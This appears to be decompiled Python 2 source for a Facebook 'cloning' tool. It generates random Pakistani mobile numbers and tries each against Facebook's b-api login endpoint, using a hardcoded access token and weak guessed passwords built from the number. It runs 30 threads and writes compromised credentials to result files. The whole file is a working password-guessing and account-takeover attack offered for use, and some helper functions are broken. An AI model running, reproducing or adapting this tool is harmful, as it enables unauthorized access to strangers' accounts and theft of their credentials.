# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Aug  8 2021, 22:51:48) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: koNtol
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(5000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')

try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('python2 .Boss.py')

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
    print 'Thanks.'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)


def tik():
    titik = [
     '   ', '.  ', '.. ', '...', '.. ', '.  ', '   ']
    for o in titik:
        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mLoa\x1b[1;93mding\x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(0.5)


def lodhirt():
    lodhirt = [
     '   ', '.  ', '.. ', '...', '.. ', '.  ', '   ']
    for o in lodhirt:
        print logo
        print '\x1b[1;93mPLEASE WAIT\x1b[1;92m' + o,
        sys.stdout.flush()
        time.sleep(0.5)
        os.system('clear')


back = 0
oks = []
id = []
cpb = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')
logo ="""
 ______   _    _   ______   ______   ______    \n| |  | | | |  | | / |      | |  | | | |  \ \   \n| |__| | | |--| | '------. | |__| | | |  | |   \n|_|  |_| |_|  |_|  ____|_/ |_|  |_| |_|  |_|   
\n\x1b[1;97m-----------------------------------------------\n\x1b[0;32m\xe2\x9e\xa3 PROGRAMER   : QAISER ABBAS \n\x1b[0;32m\xe2\x9e\xa3 FACEBOOK    : MUHAMMAD BILAL \n\x1b[0;32m\xe2\x9e\xa3 WHATSAPP    : 03079321417 \n\x1b[1;97m-----------------------------------------------
                                                 """
def lisensi():
    os.system('clear')
    login()


def login():
    print logo
    tik()
    os.system('clear')
    print logo
    time.sleep(5)
    os.system('clear')
    print logo
    tik()
    os.system('clear')
    print logo
    print '\x1b[1;0m--------------------------------------------------'
    print '\x1b[1;92m[1] \x1b[1;32mCLONING MENU'
    print '\x1b[1;0m--------------------------------------------------'
    action()


def action():
    global cpb
    global oks
    bch = raw_input('\x1b[1;97m SELECT :-  \x1b[1;91m')
    if bch == '':
        print '[!] Fill in correctly'
        action()
    elif bch == '1':
        tik()
        os.system('clear')
        print logo
        print '    \x1b[1;96mEnter any Pakistan Mobile code Number' + '\n'
        print '\x1b[1;33m--------------------------------------------------'
        print '\x1b[1;92m [00,01,02,03,04,05,06,07,08,09]'
        print '\x1b[1;91m [11,12,13,14,15,16,17,18]'
        print '\x1b[1;92m [21,22,23,24]'
        print '\x1b[1;91m [30,31,32,33,34,35,36]'
        print '\x1b[1;92m [40,41,42,43,44,45,46,47,48,49]'
        print '\x1b[1;33m--------------------------------------------------'
        try:
            c = raw_input('\x1b[1;97mSELECT :-  \x1b[1;91m')
            os.system('clear')
            k = '03'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    print logo
    print ' \x1b[1;96m      CODE YOU CHOOSE \x1b[1;97m: ' + c
    print 50 * '\x1b[1;93m-'
    xxx = str(len(id))
    print '\x1b[1;97m[!]\x1b[1;92m Total Pakistan ids:\x1b[1;93m ' + c
    print '\x1b[1;97m[!]\x1b[0;96m Wait A While Start\x1b[1;92m Cracking...'
    print '\x1b[1;97m[!]\x1b[0;34m To Stop Process Press\x1b[1;97m Ctrl+z'
    print 50 * '\x1b[1;93m-'
    print '\x1b[1;97m      IF IDS NOT COMING TURN ON AIRPLANE FOR 7 SEC AND TURN OFF AGAIN'
    print 50 * '\x1b[1;93m-'

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;97m[\x1b[1;92m Ahsan_ok \x1b[1;97m]\x1b[1;92m ' + k + c + user + '\x1b[1;97m | \x1b[1;92m' + pass1
                okb = open('Results/successfull.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[\x1b[1;91m Ahsan_cp \x1b[1;97m]\x1b[1;90m ' + k + c + user + '\x1b[1;97m | \x1b[1;90m' + pass1
                cps = open('Results/checkpoint.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = k + c + user
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;97m[\x1b[1;92m Ahsan_ok \x1b[1;97m]\x1b[1;92m ' + k + c + user + '\x1b[1;97m | \x1b[1;92m' + pass2
                    okb = open('Results/successfull.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[\x1b[1;91m Ahsan_cp \x1b[1;97m]\x1b[1;90m ' + k + c + user + '\x1b[1;97m | \x1b[1;90m' + pass2
                    cps = open('Results/checkpoint.txt', 'a')
                    cps.write(k + c + user + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 50 * '\x1b[1;91m-'
    print 'Process Has Been Completed ...'
    print 'Total Online/Offline : ' + str(len(oks)) + '/' + str(len(cpb))
    print 'Cloned Accounts Has Been Saved : Results/cloned.txt'
    jalan('Note : Your Offline account Will Open after 4 to 5 days')
    raw_input('\n\x1b[1;92m[\x1b[1;92mBack\x1b[1;95m]')
    login()


if __name__ == '__main__':
    login()
